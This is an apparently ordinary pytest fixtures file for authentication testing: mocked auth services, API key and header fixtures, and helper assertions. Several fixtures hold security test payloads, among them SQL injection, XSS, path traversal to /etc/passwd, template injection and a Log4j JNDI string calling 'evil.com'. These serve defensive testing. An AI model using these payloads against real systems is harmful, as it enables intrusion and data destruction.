"""
Shared authentication fixtures for use by all test agents.

Provides consistent authentication mocking patterns across the test suite.
"""

import os
from unittest.mock import AsyncMock, MagicMock, patch

import pytest


@pytest.fixture
def clean_auth_environment():
    """Clean authentication environment variables for each test."""
    original_api_key = os.environ.get("HIVE_API_KEY")
    original_auth_disabled = os.environ.get("HIVE_AUTH_DISABLED")

    # Remove during test
    os.environ.pop("HIVE_API_KEY", None)
    os.environ.pop("HIVE_AUTH_DISABLED", None)

    yield

    # Restore after test
    if original_api_key is not None:
        os.environ["HIVE_API_KEY"] = original_api_key
    else:
        os.environ.pop("HIVE_API_KEY", None)

    if original_auth_disabled is not None:
        os.environ["HIVE_AUTH_DISABLED"] = original_auth_disabled
    else:
        os.environ.pop("HIVE_AUTH_DISABLED", None)


@pytest.fixture
def mock_auth_service():
    """
    Mock the global auth service instance with assertion helpers.

    Use mock.assert_* methods to verify calls:
    - mock.assert_api_key_validated(expected_key): Verify validate_api_key was called
    - mock.assert_auth_checked(): Verify is_auth_enabled was called
    - mock.assert_key_retrieved(): Verify get_current_key was called
    - mock.assert_no_validation(): Verify validate_api_key was never called
    """
    with patch("lib.auth.dependencies.auth_service") as mock:
        mock.validate_api_key = AsyncMock(return_value=True)
        mock.is_auth_enabled.return_value = True
        mock.get_current_key.return_value = "test_api_key_12345"

        # Add assertion helpers
        def assert_api_key_validated(expected_key=None):
            """Assert validate_api_key was called with expected key."""
            mock.validate_api_key.assert_called()
            if expected_key is not None:
                mock.validate_api_key.assert_called_with(expected_key)

        def assert_auth_checked():
            """Assert is_auth_enabled was called."""
            mock.is_auth_enabled.assert_called()

        def assert_key_retrieved():
            """Assert get_current_key was called."""
            mock.get_current_key.assert_called()

        def assert_no_validation():
            """Assert validate_api_key was never called."""
            mock.validate_api_key.assert_not_called()

        def reset_assertions():
            """Reset all call counts for re-testing."""
            mock.validate_api_key.reset_mock()
            mock.is_auth_enabled.reset_mock()
            mock.get_current_key.reset_mock()

        mock.assert_api_key_validated = assert_api_key_validated
        mock.assert_auth_checked = assert_auth_checked
        mock.assert_key_retrieved = assert_key_retrieved
        mock.assert_no_validation = assert_no_validation
        mock.reset_assertions = reset_assertions

        yield mock


@pytest.fixture
def mock_auth_service_disabled():
    """
    Mock auth service with authentication disabled.

    Use mock.assert_* methods to verify calls:
    - mock.assert_auth_was_disabled(): Verify auth stayed disabled
    - mock.assert_no_validation(): Verify no validation occurred
    """
    with patch("lib.auth.dependencies.auth_service") as mock:
        mock.validate_api_key = AsyncMock(return_value=True)
        mock.is_auth_enabled.return_value = False
        mock.get_current_key.return_value = "test_api_key_12345"

        # Add assertion helpers
        def assert_auth_was_disabled():
            """Assert is_auth_enabled was called and returned False."""
            mock.is_auth_enabled.assert_called()
            assert mock.is_auth_enabled.return_value is False

        def assert_no_validation():
            """Assert validate_api_key was never called."""
            mock.validate_api_key.assert_not_called()

        mock.assert_auth_was_disabled = assert_auth_was_disabled
        mock.assert_no_validation = assert_no_validation

        yield mock


@pytest.fixture
def mock_auth_service_failing():
    """
    Mock auth service that rejects all requests.

    Use mock.assert_* methods to verify calls:
    - mock.assert_validation_failed(expected_key): Verify validation was attempted and failed
    - mock.assert_rejection_count(expected_count): Verify how many rejections occurred
    """
    with patch("lib.auth.dependencies.auth_service") as mock:
        mock.validate_api_key = AsyncMock(return_value=False)
        mock.is_auth_enabled.return_value = True
        mock.get_current_key.return_value = "test_api_key_12345"

        # Add assertion helpers
        def assert_validation_failed(expected_key=None):
            """Assert validate_api_key was called and returned False."""
            mock.validate_api_key.assert_called()
            if expected_key is not None:
                mock.validate_api_key.assert_called_with(expected_key)
            # Verify it returned False
            assert mock.validate_api_key.return_value is False

        def assert_rejection_count(expected_count):
            """Assert validate_api_key was called exact number of times."""
            assert mock.validate_api_key.call_count == expected_count

        mock.assert_validation_failed = assert_validation_failed
        mock.assert_rejection_count = assert_rejection_count

        yield mock


@pytest.fixture
def mock_auth_init_service():
    """Mock AuthInitService for initialization tests."""
    with patch("lib.auth.service.AuthInitService") as mock_init:
        mock_instance = MagicMock()
        mock_instance.ensure_api_key.return_value = "test_key_123456789"
        mock_instance.regenerate_key.return_value = "new_test_key_987654321"
        mock_instance.get_current_key.return_value = "test_key_123456789"
        mock_init.return_value = mock_instance
        yield mock_instance


@pytest.fixture
def valid_api_key():
    """Provide a valid API key for testing."""
    return "hive_valid_test_key_abcdef123456789"


@pytest.fixture
def invalid_api_key():
    """Provide an invalid API key for testing."""
    return "invalid_key_xyz"


@pytest.fixture
def auth_headers(valid_api_key):
    """Provide HTTP headers with valid API key."""
    return {"x-api-key": valid_api_key}


@pytest.fixture
def invalid_auth_headers(invalid_api_key):
    """Provide HTTP headers with invalid API key."""
    return {"x-api-key": invalid_api_key}


@pytest.fixture
def no_auth_headers():
    """Provide empty HTTP headers (no authentication)."""
    return {}


class AuthTestHelpers:
    """Helper methods for authentication testing."""

    @staticmethod
    async def assert_requires_auth(client, endpoint, method="GET", **kwargs):
        """Assert that an endpoint requires authentication."""
        if method.upper() == "GET":
            response = client.get(endpoint, **kwargs)
        elif method.upper() == "POST":
            response = client.post(endpoint, **kwargs)
        elif method.upper() == "PUT":
            response = client.put(endpoint, **kwargs)
        elif method.upper() == "DELETE":
            response = client.delete(endpoint, **kwargs)
        else:
            raise ValueError(f"Unsupported HTTP method: {method}")

        assert response.status_code == 401, f"Expected 401 but got {response.status_code}"

        # Check for consistent error structure
        try:
            error_data = response.json()
            assert "detail" in error_data
            assert "Invalid or missing x-api-key header" in error_data["detail"]
        except Exception:  # noqa: S110 - Silent exception handling is intentional
            pass  # Some endpoints may return non-JSON errors

    @staticmethod
    async def assert_auth_success(client, endpoint, headers, method="GET", **kwargs):
        """Assert that an endpoint accepts valid authentication."""
        kwargs.setdefault("headers", {}).update(headers)

        if method.upper() == "GET":
            response = client.get(endpoint, **kwargs)
        elif method.upper() == "POST":
            response = client.post(endpoint, **kwargs)
        elif method.upper() == "PUT":
            response = client.put(endpoint, **kwargs)
        elif method.upper() == "DELETE":
            response = client.delete(endpoint, **kwargs)
        else:
            raise ValueError(f"Unsupported HTTP method: {method}")

        # Should not be authentication failure
        assert response.status_code != 401, "Authentication failed with valid key"
        return response

    @staticmethod
    def create_malicious_payloads():
        """Create common malicious payloads for security testing."""
        return [
            "'; DROP TABLE users; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "../../../etc/passwd",  # Path traversal
            "admin' OR '1'='1",  # SQL injection variant
            "${jndi:ldap://evil.com/x}",  # Log4j injection
            "{{7*7}}",  # Template injection
            "\x00/etc/passwd",  # Null byte injection
            "A" * 10000,  # Buffer overflow attempt
            "SELECT * FROM users WHERE 1=1; --",  # SQL injection
            "<img src=x onerror=alert('xss')>",  # XSS variant
        ]

    @staticmethod
    def create_edge_case_keys():
        """Create edge case API keys for testing."""
        return [
            "",  # Empty string
            None,  # None value
            "   ",  # Whitespace only
            "k" * 1000,  # Very long key
            "key_with_ñ_unicode",  # Unicode characters
            "key\x00with\x00nulls",  # Null bytes
            "key\nwith\nlinebreaks",  # Line breaks
            "key\twith\ttabs",  # Tab characters
        ]


@pytest.fixture
def auth_helpers():
    """Provide authentication testing helper methods."""
    return AuthTestHelpers()


@pytest.fixture(scope="function")
def reset_auth_singleton():
    """
    Reset AuthService singleton and dependencies module state between tests.

    This prevents pollution from earlier tests that may have instantiated
    the auth_service global or modified its state.

    Note: AuthService is NOT a singleton class, but the module-level
    auth_service variable in lib.auth.dependencies acts as a singleton.
    """
    # Import here to avoid circular dependencies
    import lib.auth.dependencies
    import lib.auth.service

    # Store original environment state
    original_auth_disabled = os.environ.get("HIVE_AUTH_DISABLED")
    original_environment = os.environ.get("HIVE_ENVIRONMENT")

    # Force enable authentication for isolation tests
    # (tests that verify auth behavior need it enabled)
    os.environ["HIVE_AUTH_DISABLED"] = "false"
    if not original_environment:
        os.environ["HIVE_ENVIRONMENT"] = "development"

    # Create a fresh auth_service instance with auth enabled
    lib.auth.dependencies.auth_service = lib.auth.service.AuthService()

    yield

    # Restore original environment state
    if original_auth_disabled is not None:
        os.environ["HIVE_AUTH_DISABLED"] = original_auth_disabled
    else:
        os.environ.pop("HIVE_AUTH_DISABLED", None)

    if original_environment is not None:
        os.environ["HIVE_ENVIRONMENT"] = original_environment
    else:
        os.environ.pop("HIVE_ENVIRONMENT", None)

    # Create fresh instance with restored environment
    lib.auth.dependencies.auth_service = lib.auth.service.AuthService()


# Security testing patterns fixture
@pytest.fixture
def security_test_patterns():
    """Provide common security test patterns."""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "1' UNION SELECT * FROM users--",
            "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
        ],
        "xss_payloads": [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
        "injection_attempts": [
            "${jndi:ldap://evil.com/x}",  # Log4j
            "{{7*7}}",  # Template injection
            "#set($x='')#foreach($i in [1..$x])$i#end",  # Velocity template
            "{{constructor.constructor('alert(1)')()}}",  # Angular template
        ],
    }


# Authentication test scenarios
@pytest.fixture
def auth_test_scenarios():
    """Provide comprehensive authentication test scenarios."""
    return {
        "valid_scenarios": [
            {"key": "hive_valid_key_123", "description": "Standard valid key"},
            {"key": "hive_" + "a" * 50, "description": "Long valid key"},
            {
                "key": "hive_key_with_special_!@#$%^&*()",
                "description": "Key with special chars",
            },
        ],
        "invalid_scenarios": [
            {"key": "", "description": "Empty key"},
            {"key": None, "description": "None key"},
            {"key": "invalid_key", "description": "Wrong key"},
            {"key": "hive_", "description": "Incomplete key"},
            {"key": "HIVE_VALID_KEY_123", "description": "Wrong case"},
        ],
        "attack_scenarios": [
            {"key": "'; DROP TABLE users; --", "description": "SQL injection in key"},
            {"key": "<script>alert('xss')</script>", "description": "XSS in key"},
            {"key": "../../../etc/passwd", "description": "Path traversal in key"},
            {"key": "key\x00injection", "description": "Null byte injection"},
        ],
    }
